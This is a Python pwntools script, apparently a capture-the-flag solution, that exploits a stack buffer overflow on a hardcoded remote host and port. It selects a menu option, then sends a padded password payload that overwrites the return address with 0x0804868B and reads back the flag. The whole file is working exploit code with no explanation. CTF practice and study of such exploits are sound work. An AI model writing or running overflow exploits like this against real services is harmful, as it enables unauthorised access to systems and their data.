#!/usr/bin/env python3

from pwn import *
import time
import traceback

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-w']

def slar(p, recv_msg, send_msg):
    p.recvuntil(recv_msg)
    p.sendline(send_msg)

def sar(p, recv_msg, send_msg):
    p.recvuntil(recv_msg)
    p.send(send_msg)

def rn(p, n):
    return p.recvn(n)

def ru(p, recv_msg):
    return p.recvuntil(recv_msg)

def do_exp(host='', port=''):
    p=remote(host, port)

    slar(p, 'Your choice:', '1')
    slar(p, 'Please input your username:', 'aaaa')
    payload = b'b'*24 + p32(0x0804868B)
    payload += b'c'* (0x104 - len(payload))
    slar(p, 'Please input your passwd:', payload)
    ru(p, 'Success\n')

    flag = ru(p, '\n')
    print(flag)
    #p.interactive()
    return flag

def exp(host='', port=''):
    
    do_exp(host, port)

if __name__ == "__main__":
    host = '220.249.52.133'
    port = 45341
    remote_addr = '220.249.52.133:38701'
    host, port = remote_addr.split(':')
    exp(host, port)
